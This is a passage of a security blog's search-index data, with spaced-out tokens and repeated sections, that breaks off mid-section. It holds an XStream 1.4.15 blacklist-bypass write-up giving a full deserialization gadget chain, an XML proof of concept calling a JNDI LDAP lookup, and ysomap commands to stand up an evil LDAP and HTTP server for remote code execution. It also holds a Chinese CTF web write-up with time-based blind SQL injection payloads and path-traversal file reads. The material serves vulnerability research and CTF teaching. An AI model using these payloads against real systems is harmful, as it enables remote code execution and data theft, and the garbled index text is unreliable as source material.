LazyValue   )   value   ) .   createValue   (   this   ) ;   }   When   value   is   LazyValue   type ,   trigger   the   javax . swing . UIDefaults $ LazyValue . createValue ( )   .   Next ,   I   found   a   implementation   of   LazyValue   which   can   call   any   static   method   using   reflection .   Using   sun . swing . SwingLazyValue . createValue ( )   public   Object   createValue   (   final   UIDefaults   table   )   {   try   {   ReflectUtil   .   checkPackageAccess   (   className   ) ;   Class   < ? >   c   =   Class   .   forName   (   className   ,   true   ,   null   ) ;   if   (   methodName   ! =   null   )   {   Class   [ ]   types   =   getClassArray   (   args   ) ;   Method   m   =   c   .   getMethod   (   methodName   ,   types   ) ;   makeAccessible   (   m   ) ;   return   m   .   invoke   (   c   ,   args   ) ;   }   else   {   Class   [ ]   types   =   getClassArray   (   args   ) ;   Constructor   constructor   =   c   .   getConstructor   (   types   ) ;   makeAccessible   (   constructor   ) ;   return   constructor   .   newInstance   (   args   ) ;   }   }   catch   (   Exception   e   )   {   / /   Ideally   we   would   throw   an   exception ,   unfortunately   / /   often   times   there   are   errors   as   an   initial   look   and   / /   feel   is   loaded   before   one   can   be   switched .   Perhaps   a   / /   flag   should   be   added   for   debugging ,   so   that   if   true   / /   the   exception   would   be   thrown .   }   return   null   ;   }   The   line   4   to   9   will   call   a   class ' s   static   method ,   so   we   should   find   a   static   method   which   can   do   something   evil .   I   found   the   javax . naming . InitialContext . doLookup ( )   method   is   a   good   choice .   public   static   <   T   >   T   doLookup   (   String   name   )   throws   NamingException   {   return   (   T   )   (   new   InitialContext   ( ) ) .   lookup   (   name   ) ;   }   This   method   could   launch   a   JNDI   connection .   So   we   can   set   up   a   evil   LDAP / RMI   server   to   execute   arbitrary   code   we   wanted .   For   example ,   using   my   tool   ysomap   to   set   up   a   LDAP   server   and   evil   http   server   / /   set   up   a   evil   http   server   use   exploit   SimpleHTTPServer   use   payload   EvilFileWrapper   use   bullet   ClassWithEvilConstructor   set   lport   8088   set   path   / EvilObj . class   set   classname   EvilObj   set   body   \" open   - a   Calculator \"   set   type   class   run   / /   set   up   a   evil   LDAP   server   use   exploit   LDAPRefListener   set   lport   1099   set   codebase   http : / / localhost : 8088 /   set   objectName   EvilObj   run   Then ,   try   to   deserialze   the   payload ,   you   will   get   a   calculator   XD","title":"XStream   1.4 . 15   Blacklist   Bypass"},{"location":"blog/2021/xstream_blacklist_bypass/#1-gadget-overview","text":"Recently ,   I   found   a   new   deserialzation   gadget   which   can   bypass   the   latest   version   of   XStream .   This   gadget   use   the   JDK   to   construct   the   gadget   chain .   I   had   tested   the   gadget   chain   to   RCE   ( remote   code   execute )   with   the   version   of   JDK8   ( 8u162 ) .   I   think   other   version   of   JDK   also   could   trigger   this   vulnerablity   to   the   RCE .   Let ' s   look   at   this   gadget ,   and   the   detail   is   in   part   # 3 .   TreeSet . putAll   javax . naming . ldap . Rdn $ RdnEntry . compareTo   com . sun . org . apache . xpath . internal . objects . XString . equal   javax . swing . MultiUIDefaults . toString   UIDefaults . get   UIDefaults . getFromHashTable   UIDefaults $ LazyValue . createValue   SwingLazyValue . createValue   javax . naming . InitialContext . doLookup ( )","title":"# 1   Gadget   Overview"},{"location":"blog/2021/xstream_blacklist_bypass/#2-poc","text":"< sorted - set >   < javax . naming . ldap . Rdn _- RdnEntry >   < type >   ysomap   < / type >   < value   class =   \" javax . swing . MultiUIDefaults \"   serialization =   \" custom \"   >   < unserializable - parents / >   < hashtable >   < default >   < loadFactor >   0.75   < / loadFactor >   < threshold >   525   < / threshold >   < / default >   < int >   700   < / int >   < int >   0   < / int >   < / hashtable >   < javax . swing . UIDefaults >   < default >   < defaultLocale >   zh _ CN   < / defaultLocale >   < resourceCache / >   < / default >   < / javax . swing . UIDefaults >   < javax . swing . MultiUIDefaults >   < default >   < tables >   < javax . swing . UIDefaults   serialization =   \" custom \"   >   < unserializable - parents / >   < hashtable >   < default >   < loadFactor >   0.75   < / loadFactor >   < threshold >   525   < / threshold >   < / default >   < int >   700   < / int >   < int >   1   < / int >   < string >   lazyValue   < / string >   < sun . swing . SwingLazyValue >   < className >   javax . naming . InitialContext   < / className >   < methodName >   doLookup   < / methodName >   < args >   < string >   ldap : / / localhost : 1099 / EvilObj   < / string >   < / args >   < / sun . swing . SwingLazyValue >   < / hashtable >   < javax . swing . UIDefaults >   < default >   < defaultLocale   reference =   \" .. / .. / .. / .. / .. / .. / .. / javax . swing . UIDefaults / default / defaultLocale \"   / >   < resourceCache / >   < / default >   < / javax . swing . UIDefaults >   < / javax . swing . UIDefaults >   < / tables >   < / default >   < / javax . swing . MultiUIDefaults >   < / value >   < / javax . naming . ldap . Rdn _- RdnEntry >   < javax . naming . ldap . Rdn _- RdnEntry >   < type >   ysomap   < / type >   < value   class =   \" com . sun . org . apache . xpath . internal . objects . XString \"   >   < m __ obj   class =   \" string \"   >   test   < / m __ obj >   < / value >   < / javax . naming . ldap . Rdn _- RdnEntry >   < / sorted - set >   when   you   try   to   reproduce   this   vulnerablity ,   you   should   change   the   line   37 ' s   content .   For   example ,   changing   the   ldap : / / localhost : 1099 / EvilObj   to   ldap : / / your - evil - ldap - server : port / Namespace","title":"# 2   Poc"},{"location":"blog/2021/xstream_blacklist_bypass/#3-analysis","text":"First   of   all ,   XStream   can   deserialize   a   tag   with   < sorted - set >   using   the   TreeSet / TreeMapConverter .   And   the   recover   process   will   call   some   object ' s   compareTo   function   and   not   in   the   default   blacklist .   So   I   try   to   find   a   Object   with   compareTo   function .   Using   javax . naming . ldap . Rdn $ RdnEntry . compareTo ( )   public   int   compareTo   (   RdnEntry   that   )   {   int   diff   =   type   .   compareToIgnoreCase   (   that   .   type   ) ;   if   (   diff   ! =   0   )   {   return   diff   ;   }   if   (   value   .   equals   (   that   .   value   ) )   {   / /   try   shortcut   return   0   ;   }   return   getValueComparable   ( ) .   compareTo   (   that   .   getValueComparable   ( ) ) ;   }   The   field   value   is   a   Object   type ,   so   we   can   use   any   type   of   class   to   transfer   the   chain .   Using   com . sun . org . apache . xpath . internal . objects . XString . equal ( )   public   boolean   equals   (   Object   obj2   )   {   if   (   null   = =   obj2   )   return   false   ;   / /   In   order   to   handle   the   ' all '   semantics   of   / /   nodeset   comparisons ,   we   always   call   the   / /   nodeset   function .   else   if   (   obj2   instanceof   XNodeSet   )   return   obj2   .   equals   (   this   ) ;   else   if   (   obj2   instanceof   XNumber   )   return   obj2   .   equals   (   this   ) ;   else   return   str   ( ) .   equals   (   obj2   .   toString   ( ) ) ;   }   The   line   15   call   the   obj2 . toString   function ,   and   not   check   the   obj2   ' s   type .   So   we   can   find   a   anytype   class   with   toString   function .   Using   javax . swing . MultiUIDefaults . toString ( )   public   synchronized   String   toString   ( )   {   StringBuffer   buf   =   new   StringBuffer   ( ) ;   buf   .   append   (   \" { \"   ) ;   Enumeration   keys   =   keys   ( ) ;   while   (   keys   .   hasMoreElements   ( ) )   {   Object   key   =   keys   .   nextElement   ( ) ;   buf   .   append   (   key   +   \" = \"   +   get   (   key   )   +   \" ,   \"   ) ;   }   int   length   =   buf   .   length   ( ) ;   if   (   length   >   1   )   {   buf   .   delete   (   length   -   2   ,   length   ) ;   }   buf   .   append   (   \" } \"   ) ;   return   buf   .   toString   ( ) ;   }   The   line   7   trigger   the   get   function .   public   Object   get   (   Object   key   )   {   Object   value   =   super   .   get   (   key   ) ;   if   (   value   ! =   null   )   {   return   value   ;   }   for   (   UIDefaults   table   :   tables   )   {   value   =   (   table   ! =   null   )   ?   table   .   get   (   key   )   :   null   ;   if   (   value   ! =   null   )   {   return   value   ;   }   }   return   null   ;   }   And   on   get   function ,   the   line   9   call   the   javax . swing . UIDefaults . get ( )   public   Object   get   (   Object   key   )   {   Object   value   =   getFromHashtable   (   key   ) ;   return   (   value   ! =   null   )   ?   value   :   getFromResourceBundle   (   key   ,   null   ) ;   }   Next ,   the   line   2   trigger   the   getFromHashtable   function .   private   Object   getFromHashtable   (   final   Object   key   )   {   / /   ...   synchronized   (   this   )   {   value   =   super   .   get   (   key   ) ;   / /   ...   if   (   value   instanceof   LazyValue   )   {   try   {   / *   If   an   exception   is   thrown   we ' ll   just   put   the   LazyValue   *   back   in   the   table .   * /   value   =   ( (   LazyValue   )   value   ) .   createValue   (   this   ) ;   }   When   value   is   LazyValue   type ,   trigger   the   javax . swing . UIDefaults $ LazyValue . createValue ( )   .   Next ,   I   found   a   implementation   of   LazyValue   which   can   call   any   static   method   using   reflection .   Using   sun . swing . SwingLazyValue . createValue ( )   public   Object   createValue   (   final   UIDefaults   table   )   {   try   {   ReflectUtil   .   checkPackageAccess   (   className   ) ;   Class   < ? >   c   =   Class   .   forName   (   className   ,   true   ,   null   ) ;   if   (   methodName   ! =   null   )   {   Class   [ ]   types   =   getClassArray   (   args   ) ;   Method   m   =   c   .   getMethod   (   methodName   ,   types   ) ;   makeAccessible   (   m   ) ;   return   m   .   invoke   (   c   ,   args   ) ;   }   else   {   Class   [ ]   types   =   getClassArray   (   args   ) ;   Constructor   constructor   =   c   .   getConstructor   (   types   ) ;   makeAccessible   (   constructor   ) ;   return   constructor   .   newInstance   (   args   ) ;   }   }   catch   (   Exception   e   )   {   / /   Ideally   we   would   throw   an   exception ,   unfortunately   / /   often   times   there   are   errors   as   an   initial   look   and   / /   feel   is   loaded   before   one   can   be   switched .   Perhaps   a   / /   flag   should   be   added   for   debugging ,   so   that   if   true   / /   the   exception   would   be   thrown .   }   return   null   ;   }   The   line   4   to   9   will   call   a   class ' s   static   method ,   so   we   should   find   a   static   method   which   can   do   something   evil .   I   found   the   javax . naming . InitialContext . doLookup ( )   method   is   a   good   choice .   public   static   <   T   >   T   doLookup   (   String   name   )   throws   NamingException   {   return   (   T   )   (   new   InitialContext   ( ) ) .   lookup   (   name   ) ;   }   This   method   could   launch   a   JNDI   connection .   So   we   can   set   up   a   evil   LDAP / RMI   server   to   execute   arbitrary   code   we   wanted .   For   example ,   using   my   tool   ysomap   to   set   up   a   LDAP   server   and   evil   http   server   / /   set   up   a   evil   http   server   use   exploit   SimpleHTTPServer   use   payload   EvilFileWrapper   use   bullet   ClassWithEvilConstructor   set   lport   8088   set   path   / EvilObj . class   set   classname   EvilObj   set   body   \" open   - a   Calculator \"   set   type   class   run   / /   set   up   a   evil   LDAP   server   use   exploit   LDAPRefListener   set   lport   1099   set   codebase   http : / / localhost : 8088 /   set   objectName   EvilObj   run   Then ,   try   to   deserialze   the   payload ,   you   will   get   a   calculator   XD","title":"# 3   Analysis"},{"location":"writeups/2018/ddctf-web-writeup-20180421/","tags":["ctf"],"text":"DDCTF   2018   2 \u9053 WEB   Writeup   WEB00   \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u7684 \u79d8\u5bc6   step   1 :   index . php   \u9700\u8981 \u4ee5 IP : 116.85 . 43.88 \u8bbf\u95ee \uff0c http \u5934 \u52a0\u5165   X - Forwarded - For :   116.85 . 43.88   \u7ed5\u8fc7   step   2 :   \u7ed5\u8fc7 \u540e \u662f \u4e00\u4e2a \u7b80\u5355 \u7684 \u67e5\u8be2 \u529f\u80fd \uff0c \u7b80\u5355 \u6d4b\u8bd5 \u540e \u53d1\u73b0 id , title , date \u6709 \u5b89\u5168 \u5904\u7406 \uff0c \u4f46\u662f \u8868\u5355 \u4e2d \u8fd8 \u9690\u85cf \u7740 author \uff0c \u5e76\u4e14 \u6ca1\u6709 \u505a \u4efb\u4f55 \u5904\u7406 \u3002 \u4ee5 payload   a% '   &&   ' % ' = ' %   \u3001   a% '   &&   ' % ' ! = ' %   \u786e\u5b9a \u6ce8\u5165 \u5b58\u5728 , \u60f3\u7740 \u7528 union \u76f4\u63a5 \u63d0\u53d6 \u51fa\u6765 \uff0c \u53d1\u73b0 \u540e\u53f0 \u8fd8\u6709 WAF \uff0c \u6ca1 \u7ed5\u8fc7 \u8fc7\u53bb \u7ed5\u8fc7\u53bb \uff0c \u4f46\u662f \u5bf9\u4e8e \u76f2\u6ce8 \uff0c \u6210\u529f \u6784\u9020 \u51fa \u4e86 payload   a% ' && if ( 1 ,   sleep   ( 5 ) , 1 ) = ' %   , \u53d1\u751f 5 \u79d2 \u5ef6\u8fdf \u3002 \uff08 \u540e\u6765 \u60f3\u60f3 \u5176\u5b9e \u53ef\u4ee5 \u7528 bool \u578b \u76f2\u6ce8 \u63d0\u53d6 \u6570\u636e \uff09   step   3 :   \u786e\u8ba4 \u4e86 author \u5b57\u6bb5 \u53ef\u4ee5 \u6ce8\u5165 \uff0c \u4f46\u662f \u8fd9\u9053\u9898 \u8fd8\u6709 \u4e00\u4e2a \u95ee\u9898 \u5c31\u662f sha1 \u6821\u9a8c \uff0c \u8981 \u60f3 \u5199 \u811a\u672c \uff0c \u5fc5\u987b \u5148 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \u3002 \u7814\u7a76 \u4e86 \u4e00\u4e0b main . js \uff0c \u53d1\u73b0 \u4ee5 \u7c7b\u4f3c   id = title = date = author = time =   \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 sha1 \u5904\u7406 \u540e \u540e\u53f0 \u6821\u9a8c   step   4 :   \u5199 \u811a\u672c \uff0c \u4e3b\u8981 \u5305\u62ec sha1 \u6821\u9a8c \u548c \u65f6\u95f4 \u76f2\u6ce8 \uff0c \u8d34 \u4e00\u4e0b payload   payload _ 1   =   \" a% '   &&   if ( ( selEct   LENGTH ( schema _ name )   from   information _ schema . schemata   limit   { 0 } , 1 ) = { 1 } , sleep   ( 5 ) , 1 ) = ' % \"   payload _ 2   =   \" a% '   &&   if ( ( selEct   substr ( schema _ name , { 0 } , 1 )   from   information _ schema . schemata   limit   { 1 } , 1 ) = ' { 2 } ' , sleep   ( 5 ) , 1 ) = ' % \"   #   \u83b7\u53d6 \u5230 \u5e93\u540d   ddctf   payload _ 3   =   \" a% '   &&   if ( ( selEct   LENGTH ( table _ name )   from   information _ schema . tables   where   table _ schema = ' ddctf '   limit   { 0 } , 1 ) = ' { 1 } ' , sleep   ( 5 ) , 1 ) = ' % \"   payload _ 4   =   \" a% '   &&   if ( ( selEct   substr ( table _ name , { 0 } , 1 )   from   information _ schema . tables   where   table _ schema = ' ddctf '   limit   { 1 } , 1 ) = ' { 2 } ' , sleep   ( 5 ) , 1 ) = ' % \"   #   \u83b7\u53d6 \u5230\u8868\u540d   message ,   ctf _ key4   payload _ 5   =   \" a% '   &&   if ( ( selEct   LENGTH ( column _ name )   from   information _ schema . columns   where   table _ schema = ' ddctf ' && table _ name = ' ctf _ key4 '   limit   { 0 } , 1 ) = ' { 1 } ' , sleep   ( 10 ) , 1 ) = ' % \"   payload _ 6   =   \" a% '   &&   if ( ( selEct   substr ( column _ name , { 0 } , 1 )   from   information _ schema . columns   where   table _ schema = ' ddctf ' && table _ name = ' ctf _ key4 '   limit   { 1 } , 1 ) = ' { 2 } ' , sleep   ( 10 ) , 1 ) = ' % \"   #   \u83b7\u53d6 \u5230 \u5217\u540d   ctf _ key4 : secvalue ;   message :   id , title , author , time , status   payload _ 5   =   \" a% '   &&   if ( ( selEct   LENGTH ( secvalue )   from   ctf _ key4   limit   { 0 } , 1 ) = ' { 1 } ' , sleep   ( 10 ) , 1 ) = ' % \"   payload _ 6   =   \" a% '   &&   if ( ( selEct   substr ( secvalue , { 0 } , 1 )   from   ctf _ key4   limit   { 1 } , 1 ) = ' { 2 } ' , sleep   ( 10 ) , 1 ) = ' % \"   #   \u83b7\u53d6 \u5230 flag   DDCTF { MSBMCTFMXOCBYFYI }   WEB01   \u4e13\u5c5e \u94fe\u63a5   step   1 :   \u6839\u636e \u9898\u76ee \u63d0\u793a \uff0c \u9898\u76ee \u53ea \u8ddf \u94fe\u63a5 IP \u6709\u5173 \uff0c \u6240\u4ee5 \u4e3b\u8981 \u6709   http : / / 116.85 . 48.102 : 5050 / welcom / uuid   # \u4e3b\u9875   \u6ce8\u610f \u5230 \u4e0a\u9762 \u6709 email : 3814166715717836733 @ didichuxing . com   http : / / 116.85 . 48.102 : 5050 / image / banner / ZmF2aWNvbi5pY28 =   #   \u7ed9 \u4e86 \u63d0\u793a \uff0c \u53ea\u80fd \u4e0b\u8f7d . class , . ks , . ico , . xml \u6587\u4ef6   http : / / 116.85 . 48.102 : 5050 / news / topFiveNews   #   \u6ca1\u7528   http : / / 116.85 . 48.102 : 5050 / / flag / testflag / yourflag   # \u8bbf\u95ee \u62a5\u9519 \uff0c \u4f46\u662f \u66b4\u9732 \u4e86 \u63a7\u5236 \u63a7\u5236\u5668 \u8def\u5f84 com . didichuxing . ctf . controller . user . FlagController . java   step   2 :   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u731c \u8def\u5f84 \u4e86 \uff0c \u5728 github \u4e0a \u627e \u4e86 \u4e2a springmvc + mybatis \u7684   \u9879\u76ee   , \u7ecf\u8fc7 \u6d4b\u8bd5 \uff0c \u53d1\u73b0 \u4e00\u4e0b \u51e0\u4e2a \u6587\u4ef6   .. / .. / WEB - INF / web . xml   #   \u5f97\u5230 WEB - INF / applicationContext . xml \uff0c com . didichuxing . ctf . listener . InitListener   .. / .. / WEB - INF / applicationContext . xml   #   \u5f97\u5230 classpath : mybatis / config . xml   .. / .. / WEB - INF / classes / mybatis / config . xml   #   \u5f97\u5230 mapper / FlagMapper . xml   .. / .. / WEB - INF / classes / mapper / FlagMapper . xml   #   sql \u8bed\u53e5   .. / .. / WEB - INF / classes / com / didichuxing / ctf / model / Flag . class   .. / .. / WEB - INF / classes / com / didichuxing / ctf / listener / InitListener . class   .. / .. / WEB - INF / classes / com / didichuxing / ctf / controller / user / FlagController . class   .. / .. / WEB - INF / classes / sdl . ks   #   \u5bc6\u94a5 \u6587\u4ef6   .. / .. / WEB - INF / classes / com / didichuxing / ctf / service / impl / FlagServiceImpl . class   .. / .. / WEB - INF / classes / com / didichuxing / ctf / dao / FlagDao . class   step   3 :   \u628a \u4e0a\u8ff0 \u7684 class \u6587\u4ef6   \u5728\u7ebf \u7f16\u8bd1 \u53cd\u7f16\u8bd1   \u5230 java \uff0c \u9605\u8bfb \u540e \u53d1\u73b0 flagController . java   @ RequestMapping ( value = { \" / getflag / { email : [ 0 - 9a - zA - Z ' ] + } \" } ,   method = { org . springframework . web . bind . annotation . RequestMethod . POST } )   public   String   getFlag ( @ PathVariable ( \" email \" )   String   email ,   ModelMap   model )   {   Flag   flag   =   flagService . getFlagByEmail ( email ) ;   return   \" Encrypted   flag   :   \"   +   flag . getFlag ( ) ;   }   \u4ee5 \u7528\u6237 \u7684 \u90ae\u7bb1 \u6765 \u83b7\u53d6 \u52a0\u5bc6 \u7684 flag \uff0c \u90ae\u7bb1 \u5c31\u662f \u9996\u9875 \u4e0a \u7684 \u90ae\u7bb1 \uff0c \u7136\u540e \u901a\u8fc7 listener . java \u5f97\u5230 \u5177\u4f53 \u7684 \u52a0\u5bc6 \u8fc7\u7a0b   String   flag   =   \" DDCTF { \"   +   Math . abs ( sr . nextLong ( ) )   +   \" } \" ;   String   uuid   =   UUID . randomUUID ( ) . toString ( ) . replace ( \" - \" ,   \" s \" ) ;   byte [ ]   data   =   cipher . doFinal ( flag . getBytes ( ) ) ;   byte [ ]   e   =   mac . doFinal ( String . valueOf ( email . trim ( ) ) . getBytes ( ) ) ;   Flag   flago   =   new   Flag ( ) ;   flago . setId ( Integer . valueOf ( id ) ) ;   flago . setFlag ( byte2hex ( data ) ) ;   flago . setEmail ( byte2hex ( e ) ) ;   flago . setOriginFlag ( flag ) ;   flago . setUuid ( uuid ) ;   flago . setOriginEmail ( email ) ;   \u53ef\u4ee5 \u770b\u5230 Email \u88ab \u8f6c\u5316 \u4e3a 16 \u8fdb\u5236 \u7684 \u5f62\u5f0f \uff0c \u6240\u4ee5 \u9700\u8981 \u5148\u5bf9 \u90ae\u7bb1 \u505a \u5904\u7406 \uff0c \u7b80\u5355 \u7f16\u5199 \u4ee3\u7801 \uff08 \u540e\u9762 \u653e\u4e0a \u4e0a\u6765 \u653e\u4e0a\u6765 \uff09 \uff0c \u5f97\u5230 8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27 \uff0c \u4ee5   http : / / 116.85 . 48.102 : 5050 / flag / getflag / 8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27   \u8bf7\u6c42 \u540e \u5f97\u5230 \u52a0\u5bc6 \u7684 flag \u3002   step   4 :   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u5199 \u4ee3\u7801 \u89e3\u5bc6 flag \u4e86 \uff0c \u56e0\u4e3a \u5bc6\u94a5 \u6587\u4ef6 \u5728\u624b \uff0c \u53ea \u9700 \u7f16\u5199 \u7a0b\u5e8f \u7f16\u5199\u7a0b\u5e8f \u5373\u53ef \uff0c \u53c2\u8003 https : / / stackoverflow . com / questions / 39518979 / basic - program - for - encrypt - decrypt - javax - crypto - badpaddingexception - decryption ? utm _ medium = organic & utm _ source = google _ rich _ qa & utm _ campaign = google _ rich _ qa   \u9700\u8981 \u6ce8\u610f \u7684 \u662f \u8fd9\u91cc \u7528 \u4e86 \u79c1\u94a5 \u52a0\u5bc6 \u516c\u94a5 \u89e3\u5bc6 \u3002   \u89e3\u5bc6 \u540e \u5f97\u5230 flag","title":"DDCTF   2018   web   writeup"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#ddctf-2018-2web-writeup","text":"","title":"DDCTF   2018   2 \u9053 WEB   Writeup"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#web00","text":"","title":"WEB00   \u6570\u636e\u5e93 \u7684 \u79d8\u5bc6"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-1","text":"index . php   \u9700\u8981 \u4ee5 IP : 116.85 . 43.88 \u8bbf\u95ee \uff0c http \u5934 \u52a0\u5165   X - Forwarded - For :   116.85 . 43.88   \u7ed5\u8fc7","title":"step   1 :"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-2","text":"\u7ed5\u8fc7 \u540e \u662f \u4e00\u4e2a \u7b80\u5355 \u7684 \u67e5\u8be2 \u529f\u80fd \uff0c \u7b80\u5355 \u6d4b\u8bd5 \u540e \u53d1\u73b0 id , title , date \u6709 \u5b89\u5168 \u5904\u7406 \uff0c \u4f46\u662f \u8868\u5355 \u4e2d \u8fd8 \u9690\u85cf \u7740 author \uff0c \u5e76\u4e14 \u6ca1\u6709 \u505a \u4efb\u4f55 \u5904\u7406 \u3002 \u4ee5 payload   a% '   &&   ' % ' = ' %   \u3001   a% '   &&   ' % ' ! = ' %   \u786e\u5b9a \u6ce8\u5165 \u5b58\u5728 , \u60f3\u7740 \u7528 union \u76f4\u63a5 \u63d0\u53d6 \u51fa\u6765 \uff0c \u53d1\u73b0 \u540e\u53f0 \u8fd8\u6709 WAF \uff0c \u6ca1 \u7ed5\u8fc7 \u8fc7\u53bb \u7ed5\u8fc7\u53bb \uff0c \u4f46\u662f \u5bf9\u4e8e \u76f2\u6ce8 \uff0c \u6210\u529f \u6784\u9020 \u51fa \u4e86 payload   a% ' && if ( 1 ,   sleep   ( 5 ) , 1 ) = ' %   , \u53d1\u751f 5 \u79d2 \u5ef6\u8fdf \u3002 \uff08 \u540e\u6765 \u60f3\u60f3 \u5176\u5b9e \u53ef\u4ee5 \u7528 bool \u578b \u76f2\u6ce8 \u63d0\u53d6 \u6570\u636e \uff09","title":"step   2 :"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-3","text":"\u786e\u8ba4 \u4e86 author \u5b57\u6bb5 \u53ef\u4ee5 \u6ce8\u5165 \uff0c \u4f46\u662f \u8fd9\u9053\u9898 \u8fd8\u6709 \u4e00\u4e2a \u95ee\u9898 \u5c31\u662f sha1 \u6821\u9a8c \uff0c \u8981 \u60f3 \u5199 \u811a\u672c \uff0c \u5fc5\u987b \u5148 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \u3002 \u7814\u7a76 \u4e86 \u4e00\u4e0b main . js \uff0c \u53d1\u73b0 \u4ee5 \u7c7b\u4f3c   id = title = date = author = time =   \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 sha1 \u5904\u7406 \u540e \u540e\u53f0 \u6821\u9a8c","title":"step   3 :"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-4","text":"\u5199 \u811a\u672c \uff0c \u4e3b\u8981 \u5305\u62ec sha1 \u6821\u9a8c \u548c \u65f6\u95f4 \u76f2\u6ce8 \uff0c \u8d34 \u4e00\u4e0b payload   payload _ 1   =   \" a% '   &&   if ( ( selEct   LENGTH ( schema _ name )   from   information _ schema . schemata   limit   { 0 } , 1 ) = { 1 } , sleep   ( 5 ) , 1 ) = ' % \"   payload _ 2   =   \" a% '   &&   if ( ( selEct   substr ( schema _ name , { 0 } , 1 )   from   information _ schema . schemata   limit   { 1 } , 1 ) = ' { 2 } ' , sleep   ( 5 ) , 1 ) = ' % \"   #   \u83b7\u53d6 \u5230 \u5e93\u540d   ddctf   payload _ 3   =   \" a% '   &&   if ( ( selEct   LENGTH ( table _ name )   from   information _ schema . tables   where   table _ schema = ' ddctf '   limit   { 0 } , 1 ) = ' { 1 } ' , sleep   ( 5 ) , 1 ) = ' % \"   payload _ 4   =   \" a% '   &&   if ( ( selEct   substr ( table _ name , { 0 } , 1 )   from   information _ schema . tables   where   table _ schema = ' ddctf '   limit   { 1 } , 1 ) = ' { 2 } ' , sleep   ( 5 ) , 1 ) = ' % \"   #   \u83b7\u53d6 \u5230\u8868\u540d   message ,   ctf _ key4   payload _ 5   =   \" a% '   &&   if ( ( selEct   LENGTH ( column _ name )   from   information _ schema . columns   where   table _ schema = ' ddctf ' && table _ name = ' ctf _ key4 '   limit   { 0 } , 1 ) = ' { 1 } ' , sleep   ( 10 ) , 1 ) = ' % \"   payload _ 6   =   \" a% '   &&   if ( ( selEct   substr ( column _ name , { 0 } , 1 )   from   information _ schema . columns   where   table _ schema = ' ddctf ' && table _ name = ' ctf _ key4 '   limit   { 1 } , 1 ) = ' { 2 } ' , sleep   ( 10 ) , 1 ) = ' % \"   #   \u83b7\u53d6 \u5230 \u5217\u540d   ctf _ key4 : secvalue ;   message :   id , title , author , time , status   payload _ 5   =   \" a% '   &&   if ( ( selEct   LENGTH ( secvalue )   from   ctf _ key4   limit   { 0 } , 1 ) = ' { 1 } ' , sleep   ( 10 ) , 1 ) = ' % \"   payload _ 6   =   \" a% '   &&   if ( ( selEct   substr ( secvalue , { 0 } , 1 )   from   ctf _ key4   limit   { 1 } , 1 ) = ' { 2 } ' , sleep   ( 10 ) , 1 ) = ' % \"   #   \u83b7\u53d6 \u5230 flag   DDCTF { MSBMCTFMXOCBYFYI }","title":"step   4 :"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#web01","text":"","title":"WEB01   \u4e13\u5c5e \u94fe\u63a5"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-1_1","text":"\u6839\u636e \u9898\u76ee \u63d0\u793a \uff0c \u9898\u76ee \u53ea \u8ddf \u94fe\u63a5 IP \u6709\u5173 \uff0c \u6240\u4ee5 \u4e3b\u8981 \u6709   http : / / 116.85 . 48.102 : 5050 / welcom / uuid   # \u4e3b\u9875   \u6ce8\u610f \u5230 \u4e0a\u9762 \u6709 email : 3814166715717836733 @ didichuxing . com   http : / / 116.85 . 48.102 : 5050 / image / banner / ZmF2aWNvbi5pY28 =   #   \u7ed9 \u4e86 \u63d0\u793a \uff0c \u53ea\u80fd \u4e0b\u8f7d . class , . ks , . ico , . xml \u6587\u4ef6   http : / / 116.85 . 48.102 : 5050 / news / topFiveNews   #   \u6ca1\u7528   http : / / 116.85 . 48.102 : 5050 / / flag / testflag / yourflag   # \u8bbf\u95ee \u62a5\u9519 \uff0c \u4f46\u662f \u66b4\u9732 \u4e86 \u63a7\u5236 \u63a7\u5236\u5668 \u8def\u5f84 com . didichuxing . ctf . controller . user . FlagController . java","title":"step   1 :"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-2_1","text":"\u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u731c \u8def\u5f84 \u4e86 \uff0c \u5728 github \u4e0a \u627e \u4e86 \u4e2a springmvc + mybatis \u7684   \u9879\u76ee   , \u7ecf\u8fc7 \u6d4b\u8bd5 \uff0c \u53d1\u73b0 \u4e00\u4e0b \u51e0\u4e2a \u6587\u4ef6   .. / .. / WEB - INF / web . xml   #   \u5f97\u5230 WEB - INF / applicationContext . xml \uff0c com . didichuxing . ctf . listener . InitListener   .. / .. / WEB - INF / applicationContext . xml   #   \u5f97\u5230 classpath : mybatis / config . xml   .. / .. / WEB - INF / classes / mybatis / config . xml   #   \u5f97\u5230 mapper / FlagMapper . xml   .. / .. / WEB - INF / classes / mapper / FlagMapper . xml   #   sql \u8bed\u53e5   .. / .. / WEB - INF / classes / com / didichuxing / ctf / model / Flag . class   .. / .. / WEB - INF / classes / com / didichuxing / ctf / listener / InitListener . class   .. / .. / WEB - INF / classes / com / didichuxing / ctf / controller / user / FlagController . class   .. / .. / WEB - INF / classes / sdl . ks   #   \u5bc6\u94a5 \u6587\u4ef6   .. / .. / WEB - INF / classes / com / didichuxing / ctf / service / impl / FlagServiceImpl . class   .. / .. / WEB - INF / classes / com / didichuxing / ctf / dao / FlagDao . class","title":"step   2 :"},{"location":"writeups/2018/ddctf-web-writeup-20180421/#step-3_1","text":"\u628a \u4e0a\u8ff0 \u7684 class \u6587\u4ef6   \u5728\u7ebf \u7f16\u8bd1 \u53cd\u7f16\u8bd1   \u5230 java \uff0c \u9605\u8bfb \u540e \u53d1\u73b0 flagController . java   @ RequestMapping ( value = { \" / getflag / { email : [ 0 - 9a - zA - Z ' ] + } 